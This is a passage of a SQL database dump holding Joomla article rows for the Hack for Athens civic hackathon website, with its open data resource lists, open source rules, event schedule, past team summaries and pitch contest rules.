target=\"_blank\"> Gallup State of the States </a></td>\r\n<td class=\"views-field views-field-field-resource\">Gallup poll showing various data and measures across the states for political, economic data sets.</td>\r\n</tr>\r\n\r\n<tr class=\"odd views-row-first views-row-last\">\r\n<td class=\"views-field views-field-created\"><a href=\"https://explore.data.gov/Banking-Finance-and-Insurance/FDIC-Summary-of-Deposits-SOD-Download-File/eq99-z357\" target=\"_blank\"> FDIC Summary of Deposits </a></td>\r\n<td class=\"views-field views-field-field-resource\">The FDIC released data on October 12, 2012 of all branches and their deposit amounts.</td>\r\n</tr>\r\n\r\n<tr class=\"odd views-row-first views-row-last\">\r\n<td class=\"views-field views-field-created\"><a href=\"http://www2.fdic.gov/sod/\" target=\"_blank\"> FDIC Data Dictionary </a></td>\r\n<td class=\"views-field views-field-field-resource\">FDIC information and data dictionary</td>\r\n</tr>\r\n\r\n<tr class=\"odd views-row-first views-row-last\">\r\n<td class=\"views-field views-field-created\"><a href=\"http://researchcu.ncua.gov/Views/FindCreditUnions.aspx\" target=\"_blank\"> National Credit Union Data </a></td>\r\n<td class=\"views-field views-field-field-resource\">The National Credit Union\'s data on all credit unions and their deposits</td>\r\n</tr>\r\n\r\n<tr class=\"odd views-row-first views-row-last\">\r\n<td class=\"views-field views-field-created\"><a href=\"http://hackforchange.org/challenge/bureau-economic-analysis-api-challenge\" target=\"_blank\"> National Credit Union API </a></td>\r\n<td class=\"views-field views-field-field-resource\">Beta API for the Bureau of Economic Analysis.</td>\r\n</tr>\r\n\r\n<tr class=\"odd views-row-first views-row-last\">\r\n<td class=\"views-field views-field-created\"><a href=\"https://admissions.uga.edu/api/\" target=\"_blank\"> UGA Admissions API</a></td>\r\n<td class=\"views-field views-field-field-resource\">WSDL-based API used for retrieving information provided by the UGA Admissions Department.</td>\r\n</tr>\r\n</tbody>\r\n<tfoot>\r\n<tr><th>Resource</th><th>Description</th></tr>\r\n</tfoot>\r\n</table>','',1,2,'2013-04-04 02:00:28',254,'','2013-05-29 02:16:14',254,0,'0000-00-00 00:00:00','2013-04-04 02:00:28','0000-00-00 00:00:00','{\"image_intro\":\"\",\"float_intro\":\"\",\"image_intro_alt\":\"\",\"image_intro_caption\":\"\",\"image_fulltext\":\"\",\"float_fulltext\":\"\",\"image_fulltext_alt\":\"\",\"image_fulltext_caption\":\"\"}','{\"urla\":null,\"urlatext\":\"\",\"targeta\":\"\",\"urlb\":null,\"urlbtext\":\"\",\"targetb\":\"\",\"urlc\":null,\"urlctext\":\"\",\"targetc\":\"\"}','{\"show_title\":\"\",\"link_titles\":\"\",\"show_intro\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_icons\":\"\",\"show_print_icon\":\"\",\"show_email_icon\":\"\",\"show_vote\":\"\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"alternative_readmore\":\"\",\"article_layout\":\"\",\"show_publishing_options\":\"\",\"show_article_options\":\"\",\"show_urls_images_backend\":\"\",\"show_urls_images_frontend\":\"\"}',36,6,'','',1,738,'{\"robots\":\"\",\"author\":\"\",\"rights\":\"\",\"xreference\":\"\"}',0,'*',''),(42,97,'Resources','resources','<p>\r\n	New to civic hacking? Don’t worry! We’ll do our best to help match you with a team with diverse skills. If you want to learn more about civic hacking, open data, and design before the event, here are a few links to check out.\r\n</p>\r\n<div class=\"gantry-example\">\r\n	<h2>Hackathon Resources</h2>\r\n	<dl class=\"dl-horizontal large-dt\">\r\n		<dt><a href=\"http://www.rhok.org/\">Random Hacks of Kindness</a></dt>\r\n		<dd>See <a href=\"http://www.rhok.org/solutions\">solutions built at previous RHoK events</a>. Is there anything that could be re-purposed for Athens?</dd>\r\n\r\n		<dt><a href=\"http://codeforamerica.org/projects/\">Code for America apps</a></dt>\r\n		<dd>Code for America has built many open source civic apps.</dd>\r\n\r\n		<dt><a href=\"https://github.com/codeforamerica/civic-tech-patterns\">Civic Tech Patterns</a></dt>\r\n		<dd>Common practices that may help or hinder the conception or design of your civic technology.</dd>\r\n\r\n		<dt><a href=\"http://www.wired.com/opinion/2013/01/hacking-democracy/\">Hacking is Good for Democracy</a></dt>\r\n		<dd>Article by Gavin Newsom on Wired</dd>\r\n\r\n		<dt><a href=\"http://www.whitehouse.gov/blog/2013/01/22/roll-your-sleeves-get-involved-and-get-civic-hacking\">Get Involved, and Get Civic-Hacking</a></dt>\r\n		<dd>The White House call to action</dd>\r\n	</dl>\r\n</div>\r\n\r\n<div class=\"gantry-example\">\r\n<h2>Design Resources</h2>\r\n<dl class=\"dl-horizontal large-dt\">\r\n		<dt><a href=\"http://www.agiledesigners.com/\">Agile Designers</a></dt>\r\n		<dd>collection of resources on design elements, templates, frameworks, icons, fonts, and many other necessary tools for making web projects.</dd>\r\n</dd>\r\n\r\n		<dt><a href=\"http://thenounproject.com/\">Noun Project</a></dt>\r\n		<dd>open source icons</dd>\r\n</dd>\r\n\r\n		<dt><a href=\"http://colorbrewer2.org/\">ColorBrewer</a></dt>\r\n		<dd>planning to color a map? start here!</dd>\r\n</dl>\r\n</div>\r\n<div class=\"gantry-example\">\r\n<h2>Open Data Sources</h2>\r\n<dl class=\"dl-horizontal large-dt\">\r\n		<dt><a href=\"http://www.data.gov/\">Data.gov</a></dt>\r\n		<dd>catalog of data generated by the Federal Government.</dd>\r\n</dd>\r\n\r\n		<dt><a href=\"http://factfinder2.census.gov/faces/nav/jsf/pages/index.xhtml\">American FactFinder</a></dt>\r\n		<dd>data from the U.S. Census Bureau.</dd>\r\n</dd>\r\n\r\n		<dt><a href=\"http://www.census.gov/developers/\">Census Bureau APIs</a></dt>\r\n		<dd>API access to select Census Bureau datasets.</dd>\r\n</dd>\r\n\r\n		<dt><a href=\"http://nationalpriorities.org/en/interactive-data/\">National Priorities Project Data Tools</a></dt>\r\n		<dd>federal spending and tax resources.</dd>\r\n</dd>\r\n\r\n		<dt><a href=\"http://sunlightfoundation.com/projects/\">Sunlight Foundation</a></dt>\r\n		<dd>transparency tools, data, and APIs related to Congressional activities, political contributions, lobbying, and more.</dd>\r\n</dd>\r\n\r\n		<dt><a href=\"http://openstates.org/ma/\">Sunlight Open States (MA)</a></dt>\r\n		<dd>state-level legislative data, also available are <a href=\"http://openstates.org/downloads/\">bulk downloads</a>, an <a href=\"http://openstates.org/api/\">API</a>, and <a href=\"http://python-sunlight.readthedocs.org/en/latest/\">Python API client</a>.</dd>\r\n</dd>\r\n\r\n</dl>\r\n</div>\r\n<div class=\"gantry-example\">\r\n<h2>Developer Resources</h2>\r\n<dl class=\"dl-horizontal large-dt\">\r\n		\r\n		<dt><a href=\"http://d3js.org/\">D3.js</a></dt>\r\n		<dd>a JavaScript library for visualizing data. See <a href=\"http://www.recursion.org/d3-for-mere-mortals/\">D3 for mere mortals</a> to get started.</dd>\r\n</dd>\r\n\r\n		<dt><a href=\"http://www.r-project.org/\">R</a></dt>\r\n		<dd>An open source statistical programming language and community.</dd>\r\n</dd>\r\n\r\n		<dt><a href=\"https://www.enthought.com/products/canopy/\">Enthought Canopy</a></dt>\r\n		<dd>Python data analysis and visualization distribution (Express version is free).</dd>\r\n</dd>\r\n\r\n		<dt><a href=\"http://selection.datavisualization.ch/\">Data Visualization Tools</a></dt>\r\n		<dd>Comprehensive catalog of tools for mapping, charting, and visualizing data.</dd>\r\n</dd>\r\n\r\n		<dt><a href=\"http://flowingdata.com/category/tutorials/\">Flowing Data Tutorials</a></dt>\r\n		<dd>Step-by-step visualization guides. Many are restricted to Flowing Data members, but some are free to the public, and they are excellent.</dd>\r\n</dl>\r\n</div>\r\n<div class=\"gantry-example\">\r\n<h2>Getting, Cleaning, and Analyzing Data</h2>\r\n<dl class=\"dl-horizontal large-dt\">\r\n		<dt><a href=\"http://blog.hartleybrody.com/web-scraping/\">Web Scraping for Fun and Profit</a></dt>\r\n		<dd>A getting-started guide to scraping websites.</dd>\r\n</dd>\r\n\r\n		<dt><a href=\"https://scraperwiki.com/\">ScraperWiki</a></dt>\r\n		<dd>Web-based platform for building programs to extract (scrape) and analyze data from websites.</dd>\r\n</dd>\r\n\r\n		<dt><a href=\"https://github.com/OpenRefine/OpenRefine/wiki\">OpenRefine</a></dt>\r\n		<dd>An open source power tool for cleaning up large, messy datasets.</dd>\r\n</dd>\r\n\r\n		<dt><a href=\"http://mapbox.com/tilemill/\">TileMill</a></dt>\r\n		<dd>An open source design studio from MapBox for making interactive, tiled maps from a variety of data sources (ESRI shapefiles, KML, GeoJSON, CSV, etc.).&nbsp; Integrates with OpenStreetMap.</dd>\r\n</dl>\r\n</div>','',1,2,'2013-04-23 20:18:26',254,'','2013-04-23 20:41:35',254,0,'0000-00-00 00:00:00','2013-04-23 20:18:26','0000-00-00 00:00:00','{\"image_intro\":\"\",\"float_intro\":\"\",\"image_intro_alt\":\"\",\"image_intro_caption\":\"\",\"image_fulltext\":\"\",\"float_fulltext\":\"\",\"image_fulltext_alt\":\"\",\"image_fulltext_caption\":\"\"}','{\"urla\":null,\"urlatext\":\"\",\"targeta\":\"\",\"urlb\":null,\"urlbtext\":\"\",\"targetb\":\"\",\"urlc\":null,\"urlctext\":\"\",\"targetc\":\"\"}','{\"show_title\":\"\",\"link_titles\":\"\",\"show_intro\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_icons\":\"\",\"show_print_icon\":\"\",\"show_email_icon\":\"\",\"show_vote\":\"\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"alternative_readmore\":\"\",\"article_layout\":\"\",\"show_publishing_options\":\"\",\"show_article_options\":\"\",\"show_urls_images_backend\":\"\",\"show_urls_images_frontend\":\"\"}',12,5,'','',1,624,'{\"robots\":\"\",\"author\":\"\",\"rights\":\"\",\"xreference\":\"\"}',0,'*',''),(43,98,'Open Source Guidelines','open-source-guidelines','<p>We believe in giving participants the most freedom possible in licensing their work, balanced with the freedom of others to use and adapt technologies to their needs. We require that all projects worked on at Hack for Athens:</p>\r\n<ol>\r\n<li>Are licensed under an <a href=\"http://opensource.org/licenses\"> OSI approved license </a>. While you are free to choose any license, we recommend using one listed as “Licenses that are popular and widely used or with strong communities”.</li>\r\n<li>Have their code posted on a publicly available code repository. <a href=\"https://github.com/\"> GitHub </a> and <a href=\"https://code.google.com/\"> Google Code </a> are popular choices.</li>\r\n</ol>','',1,2,'2013-04-23 20:50:44',254,'','2013-05-02 20:31:34',254,0,'0000-00-00 00:00:00','2013-04-23 20:50:44','0000-00-00 00:00:00','{\"image_intro\":\"\",\"float_intro\":\"\",\"image_intro_alt\":\"\",\"image_intro_caption\":\"\",\"image_fulltext\":\"\",\"float_fulltext\":\"\",\"image_fulltext_alt\":\"\",\"image_fulltext_caption\":\"\"}','{\"urla\":null,\"urlatext\":\"\",\"targeta\":\"\",\"urlb\":null,\"urlbtext\":\"\",\"targetb\":\"\",\"urlc\":null,\"urlctext\":\"\",\"targetc\":\"\"}','{\"show_title\":\"\",\"link_titles\":\"\",\"show_intro\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_icons\":\"\",\"show_print_icon\":\"\",\"show_email_icon\":\"\",\"show_vote\":\"\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"alternative_readmore\":\"\",\"article_layout\":\"\",\"show_publishing_options\":\"\",\"show_article_options\":\"\",\"show_urls_images_backend\":\"\",\"show_urls_images_frontend\":\"\"}',2,4,'','',1,476,'{\"robots\":\"\",\"author\":\"\",\"rights\":\"\",\"xreference\":\"\"}',0,'*',''),(44,99,'Schedule','schedule','<table class=\"table table-bordered white\">\r\n<thead>\r\n<tr><th>Day</th><th>Time</th><th>Event</th><th>Information</th></tr>\r\n</thead>\r\n<tbody>\r\n<tr>\r\n<td>Saturday, May 31st</td>\r\n<td>9:00am</td>\r\n<td>Oakbrook Corporate Plaza Opens</td>\r\n<td>Doors open at 9:00am sharp.</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>9:30am - 10:30am</td>\r\n<td>Breakfast</td>\r\n<td>Breakfast is served</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>10:30am - 11:00am</td>\r\n<td>Kickoff First Day</td>\r\n<td>&nbsp;</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>11:00am - 1:00pm</td>\r\n<td>Team Formation</td>\r\n<td>Those attending form teams together (optional), select a challenge they wish to solve, then <a href=\"index.php?option=com_chronoforms&amp;view=form&amp;Itemid=195\">submit this information to us</a>.</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>1:00pm - 2:00pm</td>\r\n<td>Lunch and Registration</td>\r\n<td>Team registration and challenge selections due, lunch is served.</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>2:00pm - 5:00pm</td>\r\n<td>Team Work</td>\r\n<td>Teams work on their respective challenges and solutions.</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>5:00pm - 5:30pm</td>\r\n<td>Team Status Update</td>\r\n<td>Q&amp;A for teams who need help from the community (optional)</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>5:30pm - 6:30pm</td>\r\n<td>Team Work</td>\r\n<td>Teams work on their respective challenges and solutions.</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>6:30pm - 7:30pm</td>\r\n<td>Dinner</td>\r\n<td>Dinner is served</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>7:30pm - 8:30pm</td>\r\n<td>Speakers</td>\r\n<td><a href=\"http://mango.ctegd.uga.edu/jkissingLab/\" target=\"_blank\">&nbsp;</a></td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>8:30pm - 10:00pm</td>\r\n<td>Team Work</td>\r\n<td>Teams work on their respective challenges and solutions.</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>10:00pm</td>\r\n<td>End of first day</td>\r\n<td>Doors to the Oakbrook Corporate Plaza are locked at 10:00pm sharp!</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>&nbsp;</td>\r\n<td>&nbsp;</td>\r\n<td>&nbsp;</td>\r\n</tr>\r\n<tr>\r\n<td>Sunday, June 1st</td>\r\n<td>9:00am</td>\r\n<td>Oakbrook Corporate Plaza Opens</td>\r\n<td>Doors open at 9:00am sharp.</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>9:30am - 10:30am</td>\r\n<td>Breakfast, Kickoff Second Day</td>\r\n<td>Breakfast, welcome back, brief info session for new participants, introduction for existing teams, event status update</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>10:30am - 1:00pm</td>\r\n<td>Team Work</td>\r\n<td>Teams work on their respective challenges and solutions.</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>1:00pm - 2:00pm</td>\r\n<td>Lunch</td>\r\n<td>Lunch is served, reminder for teams that solutions are due by 6:00pm</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>2:00am - 6:30pm</td>\r\n<td>Team Work</td>\r\n<td>Teams work on their respective challenges and solutions.</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>6:30pm</td>\r\n<td>Pitch Contest Submission</td>\r\n<td>Each team submits their solution and presentation</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>6:30pm - 7:30pm</td>\r\n<td>Dinner</td>\r\n<td>Dinner is served</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>8:00pm - 10:00pm</td>\r\n<td><a href=\"index.php?option=com_content&amp;view=article&amp;id=47&amp;Itemid=201\">Pitch Contest</a></td>\r\n<td>Each team has 5-10 minutes to pitch idea.</td>\r\n</tr>\r\n<tr>\r\n<td>&nbsp;</td>\r\n<td>10:00pm</td>\r\n<td>End of second day</td>\r\n<td>End of event, thank you for helping Hack For Athens! Remember, doors to the Oakbrook Corporate Plaza&nbsp;are locked at 10:00pm sharp!</td>\r\n</tr>\r\n</tbody>\r\n</table>','',1,2,'2013-04-23 20:58:05',254,'','2014-04-16 20:54:01',254,0,'0000-00-00 00:00:00','2013-04-23 20:58:05','0000-00-00 00:00:00','{\"image_intro\":\"\",\"float_intro\":\"\",\"image_intro_alt\":\"\",\"image_intro_caption\":\"\",\"image_fulltext\":\"\",\"float_fulltext\":\"\",\"image_fulltext_alt\":\"\",\"image_fulltext_caption\":\"\"}','{\"urla\":false,\"urlatext\":\"\",\"targeta\":\"\",\"urlb\":false,\"urlbtext\":\"\",\"targetb\":\"\",\"urlc\":false,\"urlctext\":\"\",\"targetc\":\"\"}','{\"show_title\":\"\",\"link_titles\":\"\",\"show_tags\":\"\",\"show_intro\":\"\",\"info_block_position\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_icons\":\"\",\"show_print_icon\":\"\",\"show_email_icon\":\"\",\"show_vote\":\"\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"alternative_readmore\":\"\",\"article_layout\":\"\",\"show_publishing_options\":\"\",\"show_article_options\":\"\",\"show_urls_images_backend\":\"\",\"show_urls_images_frontend\":\"\"}',27,9,'','',1,1103,'{\"robots\":\"\",\"author\":\"\",\"rights\":\"\",\"xreference\":\"\"}',0,'*',''),(45,100,'Teams','teams','<p style=\"text-align: center; font-size: 1.8em; line-height: 2em; padding: 0 8em;\">We\'re pulling teams together as we speak, <a title=\"Submit Your Challenge | Hack For Athens\" href=\"/get-involved/challenges/submit-challenges/b2jcontact?bid=4\">don\'t forget to submit your team\'s information</a> when you\'re ready!</p>\r\n\r\n<span class=\"rt-article-title\">\r\n	<h2>\r\n					<a href=\"#\"> Last Year\'s Teams</a>\r\n			</h2>\r\n</span>\r\n\r\n\r\n<div class=\"rt-article-title\" style=\"margin-top: 20px;\">\r\n<h2>&nbsp;The Hotdawgs</h2>\r\n</div>\r\n<div class=\"gantry-example\">\r\n<ul>\r\n<li><strong>Challenge Tackled:</strong> <a href=\"index.php?option=com_content&amp;view=article&amp;id=51:athens-open-data-portal-challenge&amp;catid=18:challenges\">Open Data Portal Challenge</a></li>\r\n<li><strong>Synopsis of Solution:</strong>\r\n<p style=\"display: block; margin: 0.5em; text-align: justify;\">We implemented two APIs via Socrata. One provides information about district commissioners and the other gives the district boundaries in latitude and longitude. In addition, we implemented <a href=\"http://hfa-data-portal.herokuapp.com/\" target=\"_blank\">an example app</a> that allows citizens to provide an address and determine their commissioner.</p>\r\n</li>\r\n<li><strong>Team Members</strong>\r\n<ul>\r\n<li><a href=\"http://www.linkedin.com/in/glennstovall\" target=\"_blank\">Glenn Stovall</a></li>\r\n<li><a href=\"http://www.linkedin.com/pub/jonathan-wallace/9/8ba/888\" target=\"_blank\">Jonathan Wallace</a></li>\r\n<li><a href=\"http://www.linkedin.com/in/newellamanda\" target=\"_blank\">Amanda Newell</a></li>\r\n<li><a href=\"http://www.linkedin.com/pub/jennifer-johnson/5a/215/136/\" target=\"_blank\">Jennifer Johnson</a></li>\r\n<li><a href=\"http://www.linkedin.com/pub/alexandria-drake/73/179/3b7\" target=\"_blank\">Alexandria Drake</a></li>\r\n</ul>\r\n</li>\r\n<li><strong>Presentation:</strong> <a href=\"http://bit.ly/1b1abXL\" target=\"_blank\">Open Data Portal Solution | June 2nd, 2013</a></li>\r\n<li><strong>Source Code:</strong> <a href=\"https://github.com/GSto/hfa-open-data#todo\" target=\"_blank\">GitHub Repository</a> <a href=\"https://docs.google.com/a/blackboxoperations.com/document/d/1ZNvKOml8zYpLX-gEJ7OXsmio8GOxlYssKM-fWJQo8oI/edit\">Research Materials</a></li>\r\n</ul>\r\n</div>\r\n<div class=\"rt-article-title\" style=\"margin-top: 20px;\">\r\n<h2>&nbsp;Team Internets</h2>\r\n</div>\r\n<div class=\"gantry-example\">\r\n<ul>\r\n<li><strong>Challenge Tackled:</strong> <a href=\"index.php?option=com_content&amp;view=article&amp;id=49:athens-affordable-internet-challenge&amp;catid=18:challenges\">Athens Affordable Internet Challenge</a></li>\r\n<li><strong>Synopsis of Solution:</strong>\r\n<p style=\"display: block; margin: 0.5em; text-align: justify;\">Our solution to providing low-income areas with affordable broadband internet access relies upon working with businesses and community organisations to create a wireless mesh network to re-invest unused and underutilized bandwidth back into the community.</p>\r\n</li>\r\n<li><strong>Team Members</strong>\r\n<ul>\r\n<li><a href=\"http://www.linkedin.com/in/jordankburke\" target=\"_blank\">Jordan Burke</a></li>\r\n<li><a href=\"http://www.linkedin.com/in/angelkbrown\" target=\"_blank\">Angel Brown</a></li>\r\n<li><a href=\"http://www.linkedin.com/pub/peter-walker/29/253/6a7\" target=\"_blank\">Peter Walker</a></li>\r\n<li><a href=\"http://www.linkedin.com/pub/mike-wilbur/55/632/321\" target=\"_blank\">Mike Wilbur</a></li>\r\n<li><a href=\"http://www.linkedin.com/in/seandeeze\" target=\"_blank\">Sean Dunn</a></li>\r\n</ul>\r\n</li>\r\n<li><strong>Presentation:</strong> <a href=\"media/kunena/attachments/324/affordableinternetpres.pptx\" target=\"_blank\">Affordable Internet | June 2nd, 2013</a></li>\r\n<li><strong>Source Code:</strong> <a href=\"http://github.com/PendragonDevelopment/hack-for-athens\" target=\"_blank\">Affordable Internet GitHub Repository</a></li>\r\n</ul>\r\n</div>\r\n<div class=\"rt-article-title\" style=\"margin-top: 20px;\">\r\n<h2>&nbsp;Comm-unity</h2>\r\n</div>\r\n<div class=\"gantry-example\">\r\n<ul>\r\n<li><strong>Challenge Tackled:</strong> Visualizing Need to Motivate Change</li>\r\n<li><strong>Synopsis of Solution:&nbsp;</strong>\r\n<p style=\"display: block; margin: 0.5em; text-align: justify;\">It is hard to understand the scope of need in Athens as well as communities throughout the country. We have large datasets such as census data and social quality indexes, but they don\'t inform or enable action at the local community level. To affect change requires \"small data,\" that is real-time, geo-located, and communications on a human scale. <em>Comm-unity</em> is a solution that gathers information about needs within the community while delivering help to those who need it from a mobile app. With this information, an open API, and advanced visualizations, various stakeholders will be able directly impact communities across the United States -- as <em>Comm-unity</em> scales efficiently across the existing 211 infrastructure.</p>\r\n</li>\r\n<li><strong>Team Members</strong>\r\n<ul>\r\n<li><a href=\"http://www.linkedin.com/in/travisdouce\" target=\"_blank\">Travis Douce</a></li>\r\n<li><a href=\"http://www.linkedin.com/in/staceylkerr\" target=\"_blank\">Stacey Kerr</a></li>\r\n<li><a href=\"http://www.linkedin.com/pub/ankur-vashi/25/9b/94\" target=\"_blank\">Ankur Vashi</a></li>\r\n<li><a href=\"http://www.linkedin.com/pub/scott-shamp/0/881/60\" target=\"_blank\">Scott Shamp</a></li>\r\n<li><a href=\"http://www.linkedin.com/in/henryoddi\" target=\"_blank\">Henry Oddi</a></li>\r\n<li>Doug Brewer</li>\r\n</ul>\r\n</li>\r\n<li><strong>Presentation:</strong> <a href=\"media/kunena/attachments/305/comm-unity.pptx\" target=\"_blank\">Comm-unity | June 2nd, 2013</a></li>\r\n<li><strong>Source Code:</strong> <a target=\"_blank\">pending</a></li>\r\n</ul>\r\n</div>\r\n<div class=\"rt-article-title\" style=\"margin-top: 20px;\">\r\n<h2>&nbsp;Safe Water Athens</h2>\r\n</div>\r\n<div class=\"gantry-example\">\r\n<ul>\r\n<li><strong>Challenge Tackled:</strong> <a href=\"index.php?option=com_content&amp;view=article&amp;id=48:safe-drinking-water-challenge&amp;catid=18:challenges\">Safe Drinking Water Challenge</a></li>\r\n<li><strong>Synopsis of Solution:</strong>\r\n<p style=\"display: block; margin: 0.5em; text-align: justify;\">Our goal is to build a system that collects information and events from multiple sources to build the story from multiple angles, and shares the story as we know it via web, mobile, and paper. We also want to create a solution that provides opportunities for others to contribute in the future. </p>\r\n</li>\r\n<li><strong>Team Members</strong>\r\n<ul>\r\n<li><a href=\"http://www.linkedin.com/pub/baron-chandler/4/3b9/313\" target=\"_blank\">Baron Chandler</a></li>\r\n<li><a href=\"http://www.linkedin.com/in/csparnicht\" target=\"_blank\">Chris Sparnicht</a></li>\r\n</ul>\r\n</li>\r\n<li><strong>Presentation:</strong> <a href=\"media/Safe Water Athens.ppt\" target=\"_blank\">SafeWater Athens | June 2nd, 2013</a></li>\r\n<li><strong>Source Code:</strong> <a target=\"_blank\">pending</a></li>\r\n</ul>\r\n</div>','',1,2,'2013-04-23 21:23:45',254,'','2014-04-23 20:58:55',254,0,'0000-00-00 00:00:00','2013-04-23 21:23:45','0000-00-00 00:00:00','{\"image_intro\":\"\",\"float_intro\":\"\",\"image_intro_alt\":\"\",\"image_intro_caption\":\"\",\"image_fulltext\":\"\",\"float_fulltext\":\"\",\"image_fulltext_alt\":\"\",\"image_fulltext_caption\":\"\"}','{\"urla\":false,\"urlatext\":\"\",\"targeta\":\"\",\"urlb\":false,\"urlbtext\":\"\",\"targetb\":\"\",\"urlc\":false,\"urlctext\":\"\",\"targetc\":\"\"}','{\"show_title\":\"\",\"link_titles\":\"\",\"show_tags\":\"\",\"show_intro\":\"\",\"info_block_position\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_icons\":\"\",\"show_print_icon\":\"\",\"show_email_icon\":\"\",\"show_vote\":\"\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"alternative_readmore\":\"\",\"article_layout\":\"\",\"show_publishing_options\":\"\",\"show_article_options\":\"\",\"show_urls_images_backend\":\"\",\"show_urls_images_frontend\":\"\"}',30,3,'','',1,962,'{\"robots\":\"\",\"author\":\"\",\"rights\":\"\",\"xreference\":\"\"}',0,'*',''),(46,101,'Sponsorship Payment','sponsorship-payment','<p>-</p>','',1,2,'2013-04-23 22:04:17',254,'','2013-04-24 01:21:13',254,0,'0000-00-00 00:00:00','2013-04-23 22:04:17','0000-00-00 00:00:00','{\"image_intro\":\"\",\"float_intro\":\"\",\"image_intro_alt\":\"\",\"image_intro_caption\":\"\",\"image_fulltext\":\"\",\"float_fulltext\":\"\",\"image_fulltext_alt\":\"\",\"image_fulltext_caption\":\"\"}','{\"urla\":null,\"urlatext\":\"\",\"targeta\":\"\",\"urlb\":null,\"urlbtext\":\"\",\"targetb\":\"\",\"urlc\":null,\"urlctext\":\"\",\"targetc\":\"\"}','{\"show_title\":\"\",\"link_titles\":\"\",\"show_intro\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_icons\":\"0\",\"show_print_icon\":\"0\",\"show_email_icon\":\"0\",\"show_vote\":\"\",\"show_hits\":\"\",\"show_noauth\":\"\",\"urls_position\":\"\",\"alternative_readmore\":\"\",\"article_layout\":\"\",\"show_publishing_options\":\"\",\"show_article_options\":\"\",\"show_urls_images_backend\":\"\",\"show_urls_images_frontend\":\"\"}',15,2,'','',1,391,'{\"robots\":\"\",\"author\":\"\",\"rights\":\"\",\"xreference\":\"\"}',0,'*',''),(47,102,'Pitch Contest','pitch-contest','<p class=\"info\">The Pitch Contest held <a href=\"index.php?option=com_content&amp;view=article&amp;id=44&amp;Itemid=193\">after dinner on the final day</a> will allow participants to present their solution for a specific challenge to a panel of judges comprised of business and academic professionals, industry experts, and community leaders.&nbsp;</p>\r\n<div class=\"rt-article-title\" style=\"margin-top: 20px;\">\r\n<h2>&nbsp;Entry and Registration</h2>\r\n</div>\r\n<div class=\"gantry-example\">\r\n<ul>\r\n<li>There is no entry fee.&nbsp;</li>\r\n<li>Entries must be received by <a href=\"index.php?option=com_content&amp;view=article&amp;id=44&amp;Itemid=193\">June 1st at 6:30 PM EST</a>, no exceptions.</li>\r\n<li>Entries may be submitted by individuals or <a style=\"line-height: 1.3em;\" href=\"index.php?option=com_chronoforms&amp;view=form&amp;Itemid=195\">teams</a> <a style=\"line-height: 1.3em;\" href=\"index.php?option=com_users&amp;view=registration&amp;Itemid=166\">registered with Hack For Athens</a>.&nbsp;</li>\r\n<li>Each individual or team may enter one pitch only.&nbsp;</li>\r\n</ul>\r\n</div>\r\n<div class=\"rt-article-title\" style=\"margin-top: 20px;\">\r\n<h2>&nbsp;Pitch Presentations</h2>\r\n</div>\r\n<div class=\"gantry-example\">\r\n<ul>\r\n<li>Pitch presentation must be made by one person alone.</li>\r\n<li>Person presenting will have at most five minutes to present the Pitch.</li>\r\n<li>Pitch must include PowerPoint presentation with no more than three slides.</li>\r\n<li>Any demonstrations involving code or the implementation software used for the idea behind the Pitch must fit within the five minutes allowed for the presentation.&nbsp;</li>\r\n</ul>\r\n</div>\r\n<div 